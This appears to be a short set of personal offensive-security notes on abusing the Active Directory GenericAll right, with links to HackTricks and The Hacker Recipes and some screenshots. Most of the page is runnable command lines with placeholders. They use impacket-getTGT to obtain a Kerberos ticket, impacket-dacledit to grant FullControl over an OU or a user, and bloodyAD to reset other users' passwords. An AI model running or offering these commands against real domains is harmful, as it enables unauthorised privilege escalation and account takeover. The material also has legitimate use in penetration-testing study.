[https://www.thehacker.recipes/ad/movement/dacl/grant-rights](https://www.thehacker.recipes/ad/movement/dacl/grant-rights)
[https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)
  
GenericAll makes it so you can change the target’s password or extract their TGT
- impacket-getTGT <DOMAIN>/<user>:<pass> -dc-ip <ip>
![image 405.png](../../assets/GenericAll/image%20405.png)
  
now export the cache
export KRB5CCNAME=<cache_file>
![image 1 302.png](../../assets/GenericAll/image%201%20302.png)
  
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal <user> -target-dn 'OU=<OU(Group)>,DC=<DOMAIN>,DC=<DOMAIN>' <DOMAIN/user> -k -no-pass -dc-ip <IP>
![image 2 256.png](../../assets/GenericAll/image%202%20256.png)
![image 3 218.png](../../assets/GenericAll/image%203%20218.png)
- the user now owns the group assigned (in this case “MARKETING DIGITAL”)
  
When you have full control over the group, you can change the password of users in said group
- first clone “bloodyAD”
https://github.com/CravateRouge/bloodyAD
  
![image 4 189.png](../../assets/GenericAll/image%204%20189.png)
- python3 [bloodyAD.py](http://bloodyAD.py) —host <dc01.domain> -d <DOMAIN> -k -u <user> -p <pass> set password <user you want changed> <pass>
    
    - -k is for using kerberos authentication (we got the ticket above)
    
    - if we don’t have a password, just take out the -p argument (make sure the ccache file is in the same directory
    
  
  
- if you’re gaining control over just a user
    
    - impacket-dacledit -action 'write' -rights 'FullControl' -principal '<controlled_user>' -target '<target_user>' '<domain>'/'<controlled_user>':'<pass>’
    
![image 5 175.png](../../assets/GenericAll/image%205%20175.png)